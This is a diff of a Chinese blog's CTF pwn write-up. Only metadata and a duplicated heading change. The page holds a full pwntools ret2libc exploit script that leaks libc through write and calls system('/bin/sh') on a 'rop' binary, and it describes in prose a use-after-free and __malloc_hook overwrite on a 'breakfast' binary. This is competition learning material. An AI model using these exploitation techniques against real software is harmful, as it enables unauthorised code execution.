@@ -7,13 +7,13 @@
   
   <title>铁人三项赛个人赛writeup | Dkd&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="铁人三项赛个人赛writeuprop简单的栈溢出 12345678910111213141516171819202122232425from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./rop&apos;,env = &amp;#123;&quot;LD_PRELOAD&quot;:&quot;./libc32&quot;&amp;#125;)#P = remote(&apos;&apos;)elf = ELF(&apos;./">
+  <meta name="description" content="rop简单的栈溢出 12345678910111213141516171819202122232425from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./rop&apos;,env = &amp;#123;&quot;LD_PRELOAD&quot;:&quot;./libc32&quot;&amp;#125;)#P = remote(&apos;&apos;)elf = ELF(&apos;./rop&apos;)libc = ELF">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="铁人三项赛个人赛writeup">
 <meta property="og:url" content="http:/2018/05/12/铁人三项赛个人赛writeup/index.html">
 <meta property="og:site_name" content="Dkd&#39;blog">
-<meta property="og:description" content="铁人三项赛个人赛writeuprop简单的栈溢出 12345678910111213141516171819202122232425from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./rop&apos;,env = &amp;#123;&quot;LD_PRELOAD&quot;:&quot;./libc32&quot;&amp;#125;)#P = remote(&apos;&apos;)elf = ELF(&apos;./">
+<meta property="og:description" content="rop简单的栈溢出 12345678910111213141516171819202122232425from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./rop&apos;,env = &amp;#123;&quot;LD_PRELOAD&quot;:&quot;./libc32&quot;&amp;#125;)#P = remote(&apos;&apos;)elf = ELF(&apos;./rop&apos;)libc = ELF">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://i.imgur.com/CQ5ISEJ.png">
 <meta property="og:image" content="https://i.imgur.com/658TNoj.png">
@@ -21,10 +21,10 @@
 <meta property="og:image" content="https://i.imgur.com/ySbzdBn.png">
 <meta property="og:image" content="https://i.imgur.com/4p3iQ5d.png">
 <meta property="og:image" content="https://i.imgur.com/5epjwhg.png">
-<meta property="og:updated_time" content="2018-05-25T02:27:04.422Z">
+<meta property="og:updated_time" content="2018-05-25T02:28:37.279Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="铁人三项赛个人赛writeup">
-<meta name="twitter:description" content="铁人三项赛个人赛writeuprop简单的栈溢出 12345678910111213141516171819202122232425from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./rop&apos;,env = &amp;#123;&quot;LD_PRELOAD&quot;:&quot;./libc32&quot;&amp;#125;)#P = remote(&apos;&apos;)elf = ELF(&apos;./">
+<meta name="twitter:description" content="rop简单的栈溢出 12345678910111213141516171819202122232425from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./rop&apos;,env = &amp;#123;&quot;LD_PRELOAD&quot;:&quot;./libc32&quot;&amp;#125;)#P = remote(&apos;&apos;)elf = ELF(&apos;./rop&apos;)libc = ELF">
 <meta name="twitter:image" content="https://i.imgur.com/CQ5ISEJ.png">
   
     <link rel="alternate" href="/atom.xml" title="Dkd&#39;blog" type="application/atom+xml">
@@ -98,7 +98,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="铁人三项赛个人赛writeup"><a href="#铁人三项赛个人赛writeup" class="headerlink" title="铁人三项赛个人赛writeup"></a>铁人三项赛个人赛writeup</h1><h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>简单的栈溢出<br><img src="https://i.imgur.com/CQ5ISEJ.png" alt=""></p>
+        <h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>简单的栈溢出<br><img src="https://i.imgur.com/CQ5ISEJ.png" alt=""></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./rop'</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc32"</span>&#125;)</span><br><span class="line"><span class="comment">#P = remote('')</span></span><br><span class="line">elf = ELF(<span class="string">'./rop'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc32'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">140</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">'write'</span>]) + p32(<span class="number">0x0804855c</span>) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">'read'</span>]) + p32(<span class="number">4</span>)+ p32(<span class="number">0</span>) + p32(<span class="number">0x80484C6</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(read_addr)</span><br><span class="line">write_addr = read_addr - libc.symbols[<span class="string">'read'</span>] + libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = read_addr - libc.symbols[<span class="string">'read'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line"></span><br><span class="line">pay = p32(elf.plt[<span class="string">'read'</span>]) + p32(<span class="number">0x0804855c</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x804A018</span>) + p32(<span class="number">0x8</span>) + p32(<span class="number">0</span>)</span><br><span class="line">pay += p32(system_addr) + <span class="string">'bbbb'</span> + p32(<span class="number">0x804A018</span>)</span><br><span class="line"><span class="comment">#write '/bin/sh' to bss ,call system get shell</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">140</span> + pay)</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">p.send(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <h2 id="breakfast"><a href="#breakfast" class="headerlink" title="breakfast"></a>breakfast</h2><p>删除操作处理不当未清空变量存在uaf<br><img src="https://i.imgur.com/658TNoj.png" alt=""><br>这write给的,就是用来的泄露的逻辑<br><img src="https://i.imgur.com/JwjjV48.png" alt=""><br>动态一调,果然会write我没所给的地址的值,用edit写地址即可泄露<br><img src="https://i.imgur.com/ySbzdBn.png" alt=""></p>
 <p>got表没有写权限就不能直接更改got表<br><img src="https://i.imgur.com/4p3iQ5d.png" alt=""><br><img src="https://i.imgur.com/5epjwhg.png" alt=""><br>可以更改_malloc_hook能够达到类似更改malloc got的功能<br>把free的fastbin的fd指向_malloc_hook旁边能够绕过fastbin检测的地方,edit写入内容覆盖到_malloc_hook的值,跳转到one_gadget,即可shell.</p>
@@ -106,7 +106,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http:/2018/05/12/铁人三项赛个人赛writeup/" data-id="cjhlcioi90003rzwibp0nadxv" class="article-share-link">Share</a>
+      <a data-url="http:/2018/05/12/铁人三项赛个人赛writeup/" data-id="cjhlckto20003uuwir4biiz9u" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
